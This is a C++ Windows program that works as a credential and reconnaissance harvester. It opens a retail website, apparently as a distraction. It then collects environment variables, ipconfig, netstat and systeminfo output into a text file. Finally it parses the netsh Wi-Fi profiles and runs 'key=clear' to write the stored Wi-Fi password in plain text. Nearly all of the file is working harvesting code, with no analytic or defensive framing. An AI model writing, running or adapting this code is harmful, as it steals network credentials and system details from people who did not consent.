
#include <iostream>
#include <cstdlib>
#include <fstream>
#include <Windows.h>
#include <string.h>

#define _CRT_SECURE_NO_WARNINGS

using namespace std;

string convertToString(char* a, int size)
{
	int i;
	string s = "";
	for (i = 0; i < size; i++) {
		s = s + a[i];
	}
	return s;
}

int main(int argc, char* argv[])
{
	// opens web page 
	ShellExecute(NULL, L"open", L"www.nike.com", NULL, NULL, SW_SHOWNORMAL);

	// creates file
	ofstream file_;
	file_.open("crap3718924.txt");
	WinExec("cmd", 7);
	file_.close();


	file_.open("crap3718924.txt");
	if (file_.is_open())
	{	// gets all the infomation
		char* buf = nullptr;
		size_t sz = 0;

		if (_dupenv_s(&buf, &sz, "PATH") == 0 && buf != nullptr)
		{
			file_ << "PATH = " << buf << endl;
			free(buf);
		}


		if (_dupenv_s(&buf, &sz, "OS") == 0 && buf != nullptr)
		{
			file_ << "OS = " << buf << endl;
			free(buf);
		}


		if (_dupenv_s(&buf, &sz, "HOMEDRIVE") == 0 && buf != nullptr)
		{
			file_ << "HOMEDRIVE = " << buf << endl;
			free(buf);
		}


		if (_dupenv_s(&buf, &sz, "USERNAME") == 0 && buf != nullptr)
		{
			file_ << "USERNAME = " << buf << endl;
			free(buf);
		}

		if (_dupenv_s(&buf, &sz, "USERDOMAIN") == 0 && buf != nullptr)
		{
			file_ << "USERDOMAIN = " << buf << endl;
			free(buf);
		}


		if (_dupenv_s(&buf, &sz, "DATE") == 0 && buf != nullptr)
		{
			file_ << "DATE = " << buf << endl;
			free(buf);
		}

		if (_dupenv_s(&buf, &sz, "Processor_Architecture") == 0 && buf != nullptr)
		{
			file_ << "Processor_Architecture = " << buf << endl;
			free(buf);
		}

		if (_dupenv_s(&buf, &sz, "Network Information") == 0 && buf != nullptr)
		{
			file_ << "Network Information = " << buf << endl;
			free(buf);
		}

		if (_dupenv_s(&buf, &sz, "HOME") == 0 && buf != nullptr)
		{
			file_ << "HOME = " << buf << endl;
			free(buf);
		}

		if (_dupenv_s(&buf, &sz, "ROOT") == 0 && buf != nullptr)
		{
			file_ << "ROOT = " << buf << endl;
			free(buf);
		}
		if (_dupenv_s(&buf, &sz, "EMAIL") == 0 && buf != nullptr)
		{
			file_ << "ROOT = " << buf << endl;
			free(buf);
		}
	}
	
	file_ << "-----------------------------------< Network Stuff >--------------------------------------" << "\n" << "\n" << "\n";
	file_.close();


	system("C:\\WINDOWS\\System32\\ipconfig /all >> crap3718924.txt 2>>&1 ");  // network stuff
	system("C:\\WINDOWS\\System32\\netstat -n >> crap3718924.txt 2>>&1 ");

	system("C:\\WINDOWS\\System32\\systeminfo >> crap3718924.txt 2>>&1 ");   // general system info 

	char command[128] = "C:\\WINDOWS\\System32\\NETSH WLAN SHOW PROFILE >> crap3718924.txt 2>>&1";
	string strcommand = "C:\\WINDOWS\\System32\\NETSH WLAN SHOW PROFILE ";

	system(command);
	ifstream infile;
	char input[100];
	char freespace[2];
	string word;
	string all = "All";
	string user = "User";
	string profile = "Profile";
	int a = 0;
	infile.open("crap3718924.txt");


	while (infile >> input)
	{
		string word = convertToString(input, strlen(input));

		if (word == all)
		{

			infile >> input;
			string word = convertToString(input, strlen(input));
			if (word == user)
			{
				a++;
				infile >> input;
				string word = convertToString(input, strlen(input));
				if (word == profile)
				{
					infile >> freespace;
					infile >> input;
					string wifiname = convertToString(input, strlen(input));
					strcommand = strcommand + wifiname + " key=clear" + " >> crap3718924.txt 2>>&1";
					string s = strcommand;
					int n = s.length();
					char char_array[100] = { NULL };
					strcat_s(char_array, s.c_str());
					system(char_array);
					break;
				}
			}
		}
	}

	infile.close();
	return 0;
}